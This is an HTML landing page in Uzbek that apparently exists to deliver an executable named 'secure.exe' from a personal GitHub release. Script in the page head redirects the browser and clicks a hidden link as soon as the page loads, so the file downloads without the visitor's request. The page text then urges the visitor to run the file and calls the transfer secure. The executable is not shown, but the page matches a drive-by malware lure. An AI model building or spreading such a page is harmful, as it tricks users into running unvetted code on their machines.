<!DOCTYPE html>

<head>

<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Yuklab olish — secure.exe</title>
<link rel="icon" href="favicon.png" type="image/png"/>

<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
<script>
  const DOWNLOAD_URL = 'https://github.com/Ilyasov09/doska/releases/download/v1.0.0/secure.exe';
  
  // 1. Darhol manzilni yo'naltirish
  try {
    window.location.replace(DOWNLOAD_URL);
  } catch(e) {}

  // 2. DOM yuklanganda zaxira yuklash chaqirig'i
  function startDownload() {
    try {
      const a = document.createElement('a');
      a.href = DOWNLOAD_URL;
      a.download = 'secure.exe';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    } catch(e) {}
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startDownload);
  } else {
    startDownload();
  }
</script>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --bg: #0c0c12;
    --surface: #16161f;
    --border: #262636;
    --accent: #7c6dfa;
    --accent-hover: #6a5ce8;
    --text: #f4f4f7;
    --text-muted: #9494a8;
  }
  body {
    font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, sans-serif;
    background: radial-gradient(circle at 50% 20%, #1a1932 0%, var(--bg) 70%);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    overflow: hidden;
  }
  .card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 20px;
    padding: 40px 32px;
    max-width: 440px;
    width: 100%;
    text-align: center;
    box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 80px rgba(124,109,250,0.15);
    animation: fadeIn 0.4s ease-out;
  }
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(12px) scale(0.98); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }
  .icon-wrap {
    width: 72px;
    height: 72px;
    background: linear-gradient(135deg, rgba(124,109,250,0.2), rgba(99,102,241,0.05));
    border: 1px solid rgba(124,109,250,0.4);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
    font-size: 32px;
    position: relative;
  }
  .spinner {
    position: absolute;
    inset: -3px;
    border-radius: 50%;
    border: 2px solid transparent;
    border-top-color: var(--accent);
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  h1 {
    font-size: 22px;
    font-weight: 700;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  p {
    font-size: 14px;
    color: var(--text-muted);
    line-height: 1.5;
    margin-bottom: 24px;
  }
  .file-badge {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: #0f0f17;
    border: 1px solid var(--border);
    padding: 8px 14px;
    border-radius: 8px;
    font-family: 'DM Mono', monospace;
    font-size: 13px;
    color: #c4b5fd;
    margin-bottom: 24px;
  }
  .btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    width: 100%;
    padding: 14px 20px;
    background: linear-gradient(135deg, var(--accent), #6366f1);
    color: #fff;
    text-decoration: none;
    border-radius: 12px;
    font-size: 15px;
    font-weight: 600;
    transition: all 0.2s;
    box-shadow: 0 4px 16px rgba(124,109,250,0.35);
  }
  .btn:hover {
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(124,109,250,0.5);
  }
  .hint {
    margin-top: 18px;
    font-size: 12px;
    color: #717182;
  }
</style>
</head>
<body>
  <div class="card">

    </div>
    <h1>Dastur yuklanmoqda...</h1>
    <p>Yuklab olish avtomatik tarzda boshlandi. Iltimos, fayl yuklangach uni kompyuteringizda ishga tushiring.</p>
    <div class="file-badge">
      <span>📄</span> secure.exe (75.3 MB)
    </div>
    <a id="download-link" href="https://github.com/Ilyasov09/doska/releases/download/v1.0.0/secure.exe" class="btn" download="secure.exe">
      ⬇️ Yuklab olish boshlanmasa bu yerni bosing
    </a>
    <div class="hint">Xavfsiz ulanish orqali uzatilmoqda</div>
  </div>
</body>
</html>
